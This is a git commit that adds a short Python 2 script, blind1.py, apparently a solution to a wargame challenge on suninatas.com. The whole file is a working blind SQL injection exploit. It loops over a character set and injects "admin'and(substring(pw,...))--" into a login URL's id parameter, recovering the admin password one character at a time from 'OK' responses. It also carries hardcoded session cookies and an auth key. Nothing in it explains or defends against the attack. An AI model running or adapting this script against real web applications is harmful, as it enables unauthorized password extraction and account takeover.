9ed5db19ec4feb6ed73385a6db60b41507150c76
KeLibrary <wpx@daum.net>
2016-12-29 21:39:30 +0900

    Create blind1.py

---
+++ blind1.py
@@ -0,0 +1,31 @@
+import urllib
+import urllib2
+import sys
+import time
+
+string = " abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789~!@#$^&*()-_+="
+key = ""
+
+for i in range(10):
+	for j in range(len(string)):
+		payload = "admin'and(substring(pw,"+str(i+1)+",1)='"+string[j]+"')--"
+		payload = urllib.quote(payload)
+		url = "http://suninatas.com/Part_one/web22/web22.asp?id="+payload+"&pw=1"
+
+		print url
+
+		opener = urllib2.build_opener(urllib2.HTTPHandler)
+		request = urllib2.Request(url)
+		request.add_header('User-Agent', 'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.125 Safari/537.36')
+		request.add_header('Cookie', 'ASPSESSIONIDQSCSBBRT=ILIHJDADLBIDDOPOEHNPKHJB; auth%5Fkey=65038b0559e459420aa2d23093d01e4a; ASPSESSIONIDSSCSBAQS=EBPGPBICILNOGEFLFIBMANEM')
+		request.get_method = lambda:'GET'
+		data = opener.open(request)
+		data = data.read()
+
+		if "OK" in data:
+			key += string[j]
+			print "[*] Find Password!! Password is ["+key+"]"
+			break
+		else:
+			print "[-] Fail!"
+		time.sleep(0.1)
